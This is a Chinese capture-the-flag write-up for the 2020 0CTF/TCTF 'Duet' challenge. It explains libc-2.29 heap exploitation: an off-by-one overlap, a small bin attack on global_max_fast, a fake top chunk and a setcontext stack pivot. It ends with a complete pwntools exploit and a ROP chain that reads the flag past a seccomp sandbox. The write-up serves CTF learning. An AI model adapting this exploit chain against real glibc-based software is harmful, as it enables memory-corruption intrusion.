> 原文链接: https://www.anquanke.com//post/id/210160 


# 2020 0CTF/TCTF quals Duet writeup


                                阅读量   
                                **212924**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">9</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t013fe12ff9f04eb88b.png)](https://p0.ssl.qhimg.com/t013fe12ff9f04eb88b.png)



前段时间参加2020 0CTF quals遇到的libc-2.29的菜单堆题目，用到了libc-2.29的small bin attack、改global_max_fast、改top chunk、libc-2.29的迁栈，堆风水+迁栈搞得十分心累……



## 题目概要

libc-2.29 程序，只能使用calloc分配heap，只能同时有两个chunk，分配大小：0x80～0x400

有sandbox，只能ORW:

```
__ __ _____________   __   __    ___    ____
   / //_// ____/ ____/ | / /  / /   /   |  / __ )
  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |
 / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /
/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/

=============== DEUT - 琴瑟和鸣 ===============
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019
 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019
 0007: 0x15 0x0b 0x00 0x00000003  if (A == close) goto 0019
 0008: 0x15 0x0a 0x00 0x00000009  if (A == mmap) goto 0019
 0009: 0x15 0x09 0x00 0x0000000a  if (A == mprotect) goto 0019
 0010: 0x15 0x08 0x00 0x0000000c  if (A == brk) goto 0019
 0011: 0x15 0x07 0x00 0x0000000f  if (A == rt_sigreturn) goto 0019
 0012: 0x15 0x06 0x00 0x0000003c  if (A == exit) goto 0019
 0013: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0019
 0014: 0x15 0x00 0x05 0x00000002  if (A != open) goto 0020
 0015: 0x20 0x00 0x00 0x0000001c  A = flags &gt;&gt; 32 # open(filename, flags, mode)
 0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
 0017: 0x20 0x00 0x00 0x00000018  A = flags # open(filename, flags, mode)
 0018: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
```

存在一次off-by-one的机会

```
int __usercall offbyone@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;, _DWORD *a2@&lt;rdi&gt;)
`{`
  char v2; // dl
  int result; // eax
  _BYTE *v4; // [rsp-10h] [rbp-10h]
  __int64 v5; // [rsp-8h] [rbp-8h]

  __asm `{` endbr64 `}`
  v5 = a1;
  if ( *a2 != 0x13377331 )
    return puts("Amazing thing happens only once.");
  *a2 = 0;
  v4 = calloc(0x88uLL, 1uLL);
  if ( !v4 )
    _exit(-1);
  printf("合: ", 1LL);
  v2 = input_long();
  result = (_DWORD)v4 + 0x88;
  v4[0x88] = v2;
  return result;
`}`
```



## global_max_fast

这是libc中的一个值，正常情况下是0x80，size小于等于这个值的bin被认为是fast bin，如果可以把这个值改得很大，那么所有size的bin都被认为是fast bin。



## small bin attack

关键代码：

```
/*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */

  if (in_smallbin_range (nb))
    `{`
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        `{`
          bck = victim-&gt;bk;
      if (__glibc_unlikely (bck-&gt;fd != victim))
        malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin-&gt;bk = bck;
          bck-&gt;fd = bin;

          if (av != &amp;main_arena)
        set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
      /* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */
      size_t tc_idx = csize2tidx (nb);
      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
        `{`
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks over.  */
          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
             &amp;&amp; (tc_victim = last (bin)) != bin)
        `{`
          if (tc_victim != 0)
            `{`
              bck = tc_victim-&gt;bk;
              set_inuse_bit_at_offset (tc_victim, nb);
              if (av != &amp;main_arena)
            set_non_main_arena (tc_victim);
              bin-&gt;bk = bck;
              bck-&gt;fd = bin;

              tcache_put (tc_victim, tc_idx);
                `}`
        `}`
        `}`
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        `}`
    `}`
```

从small bin中取的时候会检查bck-&gt;fd != victim，这一点和libc-2.23中一样。

但是在取出来之后，如果该small bin链中还有chunk，并且对应的tcache链中没满，则会把small bin链中剩下的chunk进行unlink解链并把它放到tcache中。

漏洞就在这里，在解链chunk放到tcache的过程中并没有检查chunk的正确性，如果我们可以对已经在该small bin中某一个chunk进行写操作控制bk的话，就可以往任意地址上写一个main_arena范围的地址

```
bck = tc_victim-&gt;bk;
...
bck-&gt;fd = bin;
```

以本题为例，我们构造了一个长度为2的0xa0的small bin链，根据取small bin按FIFO的原则，改写链中第二个放入的small bin的bk字段为global_max_fast-0x10，这样在取small bin的时候就会向global_max_fast写入一个main_arena范围的地址，使得所有size的bin都是fast bin。



## 迁栈

然而在我们控了free_hook以后，我们发现libc-2.29中没有可以利用rdi控制rsp进行迁栈的gadget，所以使用了其它方法。`IO_wfile_sync`函数可以利用rdi控制rdx，函数`setcontext+0x35`处可以用rdx控rsp，两个搭配使用就可以进行迁栈。在`IO_wfile_sync+0x6d`处有`call [r12+0x20]`，这里的r12也是可以用rdi控制的，所以可以利用这条指令调用`setcontext+0x35`，实现`free_hook -&gt; IO_wfile_sync -&gt; setcontext+0x35`。

```
.text:0000000000089460 _IO_wfile_sync  proc near               ; DATA XREF: LOAD:0000000000010230↑o
.text:0000000000089460                                         ; __libc_IO_vtables:00000000001E5F00↓o ...
.text:0000000000089460
.text:0000000000089460 var_20          = qword ptr -20h
.text:0000000000089460
.text:0000000000089460 ; __unwind `{`
.text:0000000000089460                 push    r12
.text:0000000000089462                 push    rbp
.text:0000000000089463                 push    rbx
.text:0000000000089464                 mov     rbx, rdi
.text:0000000000089467                 sub     rsp, 10h
.text:000000000008946B                 mov     rax, [rdi+0A0h]
.text:0000000000089472                 mov     rdx, [rax+20h]
.text:0000000000089476                 mov     rsi, [rax+18h]
.text:000000000008947A                 cmp     rdx, rsi
.text:000000000008947D                 jbe     short loc_894AD
.text:000000000008947F                 mov     eax, [rdi+0C0h]
.text:0000000000089485                 test    eax, eax
.text:0000000000089487                 jle     loc_89590
.text:000000000008948D                 sub     rdx, rsi
.text:0000000000089490                 sar     rdx, 2
.text:0000000000089494                 call    _IO_wdo_write
.text:0000000000089499                 test    eax, eax
.text:000000000008949B                 setnz   al
.text:000000000008949E                 test    al, al
.text:00000000000894A0                 jnz     loc_895AD
.text:00000000000894A6
.text:00000000000894A6 loc_894A6:                              ; CODE XREF: _IO_wfile_sync+147↓j
.text:00000000000894A6                 mov     rax, [rbx+0A0h]
.text:00000000000894AD
.text:00000000000894AD loc_894AD:                              ; CODE XREF: _IO_wfile_sync+1D↑j
.text:00000000000894AD                 mov     rsi, [rax]
.text:00000000000894B0                 mov     rax, [rax+8]
.text:00000000000894B4                 cmp     rsi, rax
.text:00000000000894B7                 jz      short loc_89532
.text:00000000000894B9                 sub     rsi, rax
.text:00000000000894BC                 mov     r12, [rbx+98h]
.text:00000000000894C3                 sar     rsi, 2
.text:00000000000894C7                 mov     rbp, rsi
.text:00000000000894CA                 mov     rdi, r12
.text:00000000000894CD                 call    qword ptr [r12+20h]
```

```
.text:0000000000055E35 setcontext + 0x35      
.text:0000000000055E35                 mov     rsp, [rdx+0A0h]
.text:0000000000055E3C                 mov     rbx, [rdx+80h]
.text:0000000000055E43                 mov     rbp, [rdx+78h]
.text:0000000000055E47                 mov     r12, [rdx+48h]
.text:0000000000055E4B                 mov     r13, [rdx+50h]
.text:0000000000055E4F                 mov     r14, [rdx+58h]
.text:0000000000055E53                 mov     r15, [rdx+60h]
.text:0000000000055E57                 mov     rcx, [rdx+0A8h]
.text:0000000000055E5E                 push    rcx
.text:0000000000055E5F                 mov     rsi, [rdx+70h]
.text:0000000000055E63                 mov     rdi, [rdx+68h]
.text:0000000000055E67                 mov     rcx, [rdx+98h]
.text:0000000000055E6E                 mov     r8, [rdx+28h]
.text:0000000000055E72                 mov     r9, [rdx+30h]
.text:0000000000055E76                 mov     rdx, [rdx+88h]
.text:0000000000055E76 ; `}` // starts at 55E00
.text:0000000000055E7D ; __unwind `{`
.text:0000000000055E7D                 xor     eax, eax
.text:0000000000055E7F                 retn
```



## 利用思路
1. 通过一次off-by-one的机会改0x200大小的chunk的size为0x2f0，利用这个overlap进行堆风水。
1. small_bin attack向global_max_fast写一个main_arena范围的地址，这样一来使得所有size的bin都是fast_bin，main_arena里每个位置上存储的就是对应size的fast_bin链的起始地址。
1. 利用第一步overlap的chunk改写main_arena对应位置的内容，在main_arena里构造一个fake_chunk和假的fast_bin链起始地址，这样就可以calloc到main_arena上。
1. free_hook-0xb68附近有可以利用的0x100作为size，把main_arena对应位置的值改到这里；在这里写一个fake top chunk size，改main_arena+96处即top chunk的指针到fake top chunk处，这样就可以calloc到libc上。（注意在修改top chunk有一些检查，需要`*(main_arena+0x78) == main_arena+0x60`）。
1. 用fake top chunk进行几次calloc就可以覆盖到free_hook，布好rop利用rdi进行迁栈就可以了。


## EXP

完整的exp如下：

```
#!/usr/bin/python
#coding=utf-8
from pwn import *

context.terminal = ['tmux','splitw','-h']

qin = 0xb490e7
se = 0x9f91e7

if args.R:
    p = remote('pwnable.org',  12356)
else:
    p = process("./duet")

def Gong(ind, size, content = ''):
    # Add
    assert ind == 0 or ind == 1
    p.sendlineafter(": ", "1")
    if ind == 0:
        p.sendlineafter("Instrument: ", p32(0xb490e7))
    else:
        p.sendlineafter("Instrument: ", p32(0x9f91e7))
    assert 0x7f &lt; size &lt;= 0x400
    p.sendlineafter("Duration: ", str(size))
    p.sendafter("Score: ", content.ljust(size,'x00'))

def Shang(ind):
    # Free
    assert ind == 0 or ind == 1
    p.sendlineafter(": ", "2")
    if ind == 0:
        p.sendlineafter("Instrument: ", p32(0xb490e7))
    else:
        p.sendlineafter("Instrument: ", p32(0x9f91e7))

def Jue(ind):
    # Show (write)
    assert ind == 0 or ind == 1
    p.sendlineafter(": ", "3")
    if ind == 0:
        p.sendlineafter("Instrument: ", p32(0xb490e7))
    else:
        p.sendlineafter("Instrument: ", p32(0x9f91e7))

def Zhi(byte):
    # calloc(0x88uLL, 1uLL) off-one-byte
    p.sendlineafter(": ", "5")
    assert 0 &lt; byte &lt; 256
    p.sendline(str(byte))

fake_size = 0xe0
broken_chunk = 0x1f0
pad_chunk = 0x240
#gdb.attach(p,'c')
#pause()
for i in range(7):
    Gong(0,broken_chunk)
    Shang(0)
for i in range(7):
    Gong(0,broken_chunk + fake_size + 0x10)
    Shang(0)
for i in range(7):
    Gong(0,0x1b0)
    Shang(0)
for i in range(7):
    Gong(0, 0xf0)
    Shang(0)  
for i in range(6):
    Gong(0, 0x90)
    Shang(0)   
for i in range(6):
    Gong(0, 0x80)
    Shang(0)   
for i in range(7):
    Gong(0, pad_chunk)
    Shang(0)      
for i in range(7):
    Gong(0,0x100)
    Shang(0)

Gong(0,0x1b0)
Gong(1,0x80)
Shang(0)
Shang(1)
Gong(0,0x1b0-0xa0) # 0xa0 unsortedbin
Shang(0)
Gong(0,0x1b0)
Gong(1,broken_chunk)
Shang(0)
Gong(0,0x1b0-0x90) # 0x90 unsortedbin
Shang(0)
Gong(0,broken_chunk,p64(0)*(fake_size / 8 + 1) + p64(broken_chunk - fake_size + 1))
Zhi(fake_size + 0x11)
Shang(1)

Gong(1, 0x3f0,'x00'*0x48 + p64(0x401-0x50))
Shang(1)
Gong(1,pad_chunk,'x00'*0x1f8 + p64(0x201))
Shang(0)
Jue(1)
p.recvuntil(": ")
p.recvn(0x200)
heap = u64(p.recv(8))
main_arena = u64(p.recv(8))
main_arena -= 96
libc_base = main_arena - 0x10 - 0x1E4C30
global_max_fast = libc_base + 0x1e7600
free_hook = libc_base + 0x1E75A8
initial = free_hook - 0xb68
log.info('heap : %s' % hex(heap))
log.info('libc_base : %s' % hex(libc_base))
log.info('main_arena : %s' % hex(main_arena))
log.info('global_max_fast : %s' % hex(global_max_fast))
log.info('free_hook : %s' % hex(free_hook))
payload = 'x00'*0x48+p64(0xa1)+ p64(heap-1344)+p64(global_max_fast -0x10) # fake 0xa0 small chunk
payload += 'x00'*0x80 + p64(0xa0) +p64(0x110)
Gong(0, 0xf0, payload)  
Shang(0)
Gong(0, 0x90)
log.info('global_max_fast changed') 
Shang(0)
Shang(1)

payload = 'x00'*0x1f8 + p64(0xe1)
Gong(1,0x248,payload)
Shang(1)
payload = 'x00'*0x48 + p64(0x201)
Gong(0,0xd0,payload)
payload = p64(0) + p64(0x201) + p64(0) + p64(0x191) + p64(0) + p64(0x181) + p64(0) + p64(0x171) + p64(0) + p64(0x161) + p64(0) + p64(0x151) + p64(0) + p64(0x141)
payload += p64(0) + p64(0x131) + p64(0) + p64(0x121) + p64(0) + p64(0x111) + p64(0) + p64(0x101) + p64(0) + p64(0xf1)
Gong(1,0x1f0,payload.rjust(0xf0,'x00'))
Shang(1)
payload = 'x00'*0x1f8 + p64(0x91)
Gong(1,0x248,payload)
Shang(1)
Shang(0)
payload = 'x00'*0x1f8 + p64(0x91) + p64(0x111)
Gong(1,0x248,payload)
Shang(1)
Gong(0,0x80, 'x00'*0x48 + p64(0x81))
payload = 'x00'*0x1f8 + p64(0x111)
Gong(1,0x248,payload)
Shang(1)
Shang(0)

payload = 'x00'*0x1f8 + p64(0x111) + p64(main_arena + 64)
Gong(0,0x248,payload)
Gong(1,0x100, 'x00'*0x48 + p64(0x201) + 'x00'*0x70 + p64(0) + p64(0x161) + p64(0) + p64(0x151) + p64(0) + p64(0x141) + p64(0) + p64(0x131))
Shang(0)
payload = 'x00'*0x1f8 + p64(0xe1)
Gong(0,0x248,payload)
Shang(0)
Shang(1)

top_chunk = initial + 0x10

payload = 'x00'*0x10 + p64(top_chunk) + 'x00'*0xc8 + p64(main_arena + 304) + p64(304*2 + 1)
Gong(0,0x100,payload)

payload = 'x00'*0x18 + p64(0x21)
Gong(1,304*2-0x10,payload)
Shang(0)

pad = main_arena + 0x60

payload = p64(pad)*2 + p64(top_chunk) + p64(pad)*3 + p64(free_hook-0xb68-1) + p64(pad)*22 + p64(0x21)
Gong(0,0x100,payload)
Shang(0)
Shang(1)

pop_rdi = libc_base + 0x0000000000026542
pop_rsi = libc_base + 0x0000000000026f9e
pop_rdx = libc_base + 0x000000000012bda6
pop_rax = libc_base + 0x0000000000047cf8
syscall = libc_base + 0x000000000010CF7F
flag = free_hook + 8
read_addr = libc_base + 0x10CF70
write_addr = libc_base + 0x10D010
ropchain = p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(4) + p64(pop_rax) + p64(2) + p64(syscall)
ropchain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x20) + p64(read_addr)
ropchain += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x20) + p64(write_addr)

Gong(0,0xf8,'x00' + p64(0) + p64(0x21001))
payload = p64(pad)*2 + p64(top_chunk) + p64(pad)*3
Gong(1,0x100,payload)
Shang(1)
Gong(1,0x400,'aaaaaaaa')
Shang(1)
Gong(1,0x400,'aaaaaaaa')
Shang(1)
setcontext = libc_base + 0x55E35
tar = free_hook - 0x328
rdx = tar + 0xe0-0xa0 -8
tar_rsp = tar + 0xe0
io_wfile_sync = 0x89460 + libc_base
payload = p64(0) + p64(1) + p64(2) + p64(rdx)*4 + 'x00'*0x60 + p64(tar+0xb0) # 0xa0
payload += p64(tar) + p64(0) # 0xb0
payload += 'x00'*0x20 + p64(setcontext) + p64(tar_rsp + 8) #0xe0
payload += ropchain
payload = payload.ljust(0x328,'x00') + p64(io_wfile_sync) + './flagx00'
Gong(1,0x400,payload)
Shang(1)
p.interactive()
```
